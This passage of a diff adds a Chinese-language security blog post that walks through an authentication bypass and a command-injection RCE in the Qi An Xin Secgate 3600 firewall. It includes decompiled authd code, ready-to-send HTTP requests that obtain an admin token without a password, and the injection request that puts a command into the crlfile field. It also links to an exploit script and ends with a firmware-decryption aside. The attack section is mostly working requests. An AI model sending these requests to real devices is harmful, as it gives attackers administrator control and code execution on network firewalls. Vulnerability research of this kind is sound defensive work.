class="line">  <span class="keyword">if</span> (lVar1 == *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> iVar2;</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>这里最重要的是将<code>auth_type</code>设置为5, 接下来使用<code>admin_user_auth_csmp_no_password</code>函数转发到authd程序中</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/authd.jpg"
+                      alt="img"
+                ></p>
+<p>authd会根据<code>auth_handle-&gt;authsrv_name</code>的不同,调用对应的函数,我们这一次的例子中是admindb</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/call.jpg"
+                      alt="img"
+                ></p>
+<p>这个回调函数的注册是在FUN_00406d70中<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/call_func.jpg"
+                      alt="img"
+                ></p>
+<p>这个call_back_func是我自己命名的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/pam_admindb.jpg"
+                      alt="img"
+                ></p>
+<p>进入到0x0040c7d0</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/no_pwd.jpg"
+                      alt="img"
+                ></p>
+<p>进入到对应的函数我们可以看到当auth_type等于5时候是不需要调用<code>local_db_auth_check</code>函数检查密码的</p>
+<h3 id="免密登录的总结"><a href="#免密登录的总结" class="headerlink" title="免密登录的总结"></a>免密登录的总结</h3><ol>
+<li>请求POST请求&#x2F;auth获取<code>access_token</code></li>
+</ol>
+<div class="code-container" data-rel="Https"><figure class="iseeu highlight https"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/auth</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx:xxxx</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>__s_sessionid__=cei44sqaq2ok0gnni1rkpej6r2</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>66</span><br><span class="line"><span class="attribute">X-Timestamp</span><span class="punctuation">: </span>1743977367</span><br><span class="line"><span class="attribute">X-Authorization</span><span class="punctuation">: </span>7d97a37478ae581af1190ce13bec50aee905ae30</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;134&quot;, &quot;Not:A-Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;134&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://xxx.xxx.xxx.xxx:xxxx</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://xxx.xxx.xxx.xxx:xxxx/login.html?lang=zh_cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=1, i</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">username</span>=admin&amp;lms_ip=<span class="number">127.0.0.1</span>&amp;lms_port=<span class="number">80</span>&amp;client_id=<span class="number">123</span>&amp;uuid=<span class="number">456</span></span></span><br></pre></td></tr></table></figure></div>
+
+<ol start="2">
+<li>使用获取的<code>access_token</code>让Cookie生效</li>
+</ol>
+<div class="code-container" data-rel="Https"><figure class="iseeu highlight https"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/auth/8f5c7ead63a92dda3c5a8c2854faed592d682ef5?token=8f5c7ead63a92dda3c5a8c2854faed592d682ef5</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx:xxxx</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>__s_sessionid__=cei44sqaq2ok0gnni1rkpej6r2</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;134&quot;, &quot;Not:A-Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;134&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://xxx.xxx.xxx.xxx:xxxx/login.html?lang=zh_cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0, i</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br></pre></td></tr></table></figure></div>
+
+<ol start="3">
+<li>然后通过访问根路径来获取我们的Token,当我们携带有效的Cookie访问时会返回Token,这样我们就能够去访问后台的api接口了。</li>
+</ol>
+<div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">id</span>=<span class="string">&quot;token&quot;</span> <span class="attr">name</span>=<span class="string">&quot;__hash__&quot;</span> <span class="attr">content</span>=<span class="string">&quot;XXXXXXXXX&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="后台RCE"><a href="#后台RCE" class="headerlink" title="后台RCE"></a>后台RCE</h3><p>后台的RCE,挑了一个没有过滤和其他影响的，所以我们快速来看一下吧。</p>
+<p>回到上面生成的登录json数据,其他的后台接口都会使用差不多的逻辑,比如我们注入的接口,包括我们在请求包中看到的其他接口都是类似的</p>
+<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;head&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;module&quot;</span><span class="punctuation">:</span><span class="string">&quot;pki&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;function&quot;</span><span class="punctuation">:</span><span class="string">&quot;set_pki_trust_auth&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;body&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;pki_auth_cp&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;crlfile&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>请求路径是&#x2F;data.html,可以在路由规则中找到相应的处理文件ApiController.class.php</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!IS_AJAX || !<span class="title function_ invoke__">token_check</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_TOKEN&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">send_http_status</span>(<span class="string">&#x27;403&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$Post_Data</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>];</span><br><span class="line">    <span class="variable">$Post_Header_Data</span> = <span class="title function_ invoke__">create_header</span>(<span class="variable">$Post_Data</span>);</span><br><span class="line">    <span class="variable">$mgd_res</span> = <span class="title function_ invoke__">php_call_mgd</span>(<span class="variable">$Post_Header_Data</span>);</span><br><span class="line">    <span class="variable">$mgd_arr</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$mgd_res</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div>
+<p>这里是调用了php_call_mgd, 我使用了更加简单和传统的方法就是搜索字符串,还是拿上面的json数据,我们搜索<code>set_pki_trust_auth</code>字符串,会在libsg_sc.so中找到一个结构体</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/set_pki_trust_auth.jpg"
+                      alt="img"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/pki_op_func.jpg"
+                      alt="img"
+                ></p>
+<p>还是搜索pki_op_func,我们最后会在libsg_cmdlib.so找到调用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/sg_command_pki.jpg"
+                      alt="img"
+                ></p>
+<p>是否记得刚才那个结构体我们char上还有一个int,这个int就是我们的type,我们的漏洞函数的type是0x2B,在这些if else中最符合的就是<code>mgd_pki_auth_cfg</code>函数<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/sg_command_pki_2.jpg"
+                      alt="img"
+                ></p>
+<p>进入<code>mgd_pki_auth_cfg</code>函数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/mgd_pki_auth_cfg.jpg"
+                      alt="img"
+                ></p>
+<p>红色就是我们的命令注入,选择它的原因也是不管怎样它都会去执行这个删除命令。</p>
+<p>至于数据解析需要进入我们的<code>sg_pki_auth_cp_j2s</code>函数负责解析这个函数的数据,解析数据的函数在libsg_cfg.so<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/json0x180.jpg"
+                      alt="img"
+                ></p>
+<p>我们的crlfile值保存在0x180的位置,正好符合mgd_pki_auth_cfg的调用<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/data1.jpg"
+                      alt="img"
+                ></p>
+<h3 id="RCE总结"><a href="#RCE总结" class="headerlink" title="RCE总结"></a>RCE总结</h3><p>我们的注入点在crlfile,直接不提供name就可以注入。</p>
+<div class="code-container" data-rel="Https"><figure class="iseeu highlight https"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/data.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx:xxxx</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>__s_sessionid__=6tjn05tfnpjti1pgm0083b49a0</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>199</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;macOS&quot;</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;134&quot;, &quot;Not:A-Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;134&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=UTF-8</span><br><span class="line"><span class="attribute">Token</span><span class="punctuation">: </span>xxxxxxxxxx</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://xxx.xxx.xxx.xxx:xxxx/login</span><br><span class="line"></span><br><span class="line"><span class="language-prolog"></span></span><br><span class="line"><span class="language-prolog">[</span></span><br><span class="line"><span class="language-prolog">    &#123;</span></span><br><span class="line"><span class="language-prolog">        <span class="string">&quot;head&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-prolog">            <span class="string">&quot;function&quot;</span>: <span class="string">&quot;set_pki_trust_auth&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">            <span class="string">&quot;module&quot;</span>: <span class="string">&quot;pki&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">            <span class="string">&quot;page_index&quot;</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="language-prolog">            <span class="string">&quot;page_size&quot;</span>: <span class="number">20</span></span></span><br><span class="line"><span class="language-prolog">        &#125;,</span></span><br><span class="line"><span class="language-prolog">        <span class="string">&quot;body&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-prolog">            <span class="string">&quot;pki_auth_cp&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-prolog">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">                <span class="string">&quot;crlfile&quot;</span>: <span class="string">&quot;command injection&quot;</span></span></span><br><span class="line"><span class="language-prolog">            &#125;</span></span><br><span class="line"><span class="language-prolog">        &#125;</span></span><br><span class="line"><span class="language-prolog">    &#125;</span></span><br><span class="line"><span class="language-prolog">]</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="漏洞分析END"><a href="#漏洞分析END" class="headerlink" title="漏洞分析END"></a>漏洞分析END</h2><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/Zhi0Yuan/MyBlog/blob/main/SecGate/Exploit.py" >exp<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h3 id="番外篇固件解密"><a href="#番外篇固件解密" class="headerlink" title="番外篇固件解密"></a>番外篇固件解密</h3><p>我从镜像中提取到的固件是<code>hw6.1.13.122100.sign</code></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">chroot</span> . ./qemu-x86_64-static ./secgatefile/secgate/bin/sg_sign -C -i ./hw6.1.13.122100.sign -o ./hw6tmp.tgz -c ./secgatefile/secgate/etc/conf/cert/system.crt </span><br></pre></td></tr></table></figure></div>
+
+<p>script&#x2F;update.sh脚本中<code>unsignsystempackage</code>函数</p>
+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">SG_SIGN=/secgate/bin/sg_sign</span><br><span class="line">SG_CRT=/secgate/etc/conf/cert/system.crt</span><br><span class="line"><span class="keyword">function</span> unsignsystempackage</span><br><span class="line">&#123;</span><br><span class="line">	ERR=0</span><br><span class="line">	<span class="built_in">cd</span> <span class="variable">$path</span></span><br><span class="line">	<span class="variable">$SG_SIGN</span> -C -i <span class="variable">$image</span> -o tmp.tgz -c <span class="variable">$SG_CRT</span></span><br><span class="line">	<span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">&quot;unsign package failed&quot;</span></span><br><span class="line">		ERR=<span class="variable">$UNSIGN_PACKAGE_FAILED</span></span><br><span class="line">		<span class="built_in">exit</span> <span class="variable">$ERR</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">	tar -zxf tmp.tgz</span><br><span class="line">	<span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">&quot;uncompress package failed&quot;</span></span><br><span class="line">		ERR=<span class="variable">$UNCOMPRESS_FAILED</span></span><br><span class="line">		<span class="built_in">exit</span> <span class="variable">$ERR</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">	<span class="built_in">rm</span> tmp.tgz -f</span><br><span class="line"></span><br><span class="line">	<span class="built_in">exit</span> <span class="variable">$ERR</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 奇安信网神Secgate3600防火墙认证绕过+RCE</li>
+        <li><strong>Author:</strong> Zhiyuan</li>
+        <li><strong>Created at
+                :</strong> 2025-03-28 14:28:52</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-05-17 14:39:47
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/03/28/Secgate-3600-RCE/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Vulnerability/">#Vulnerability</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Network-Security-Device/">#Network-Security-Device</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E5%A5%87%E5%AE%89%E4%BF%A1/">#奇安信</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2024/11/11/Pwn2Own-2024-QHora-322/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">Pwn2Own-2024-QHora-322</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">奇安信网神Secgate3600防火墙认证绕过+RCE</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#version"><span class="nav-text">version</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-text">描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-text">漏洞成因</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95"><span class="nav-text">免密登录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95%E7%9A%84%E6%80%BB%E7%BB%93"><span class="nav-text">免密登录的总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0RCE"><span class="nav-text">后台RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RCE%E6%80%BB%E7%BB%93"><span class="nav-text">RCE总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90END"><span class="nav-text">漏洞分析END</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%95%AA%E5%A4%96%E7%AF%87%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86"><span class="nav-text">番外篇固件解密</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Zhiyuan</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        6 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
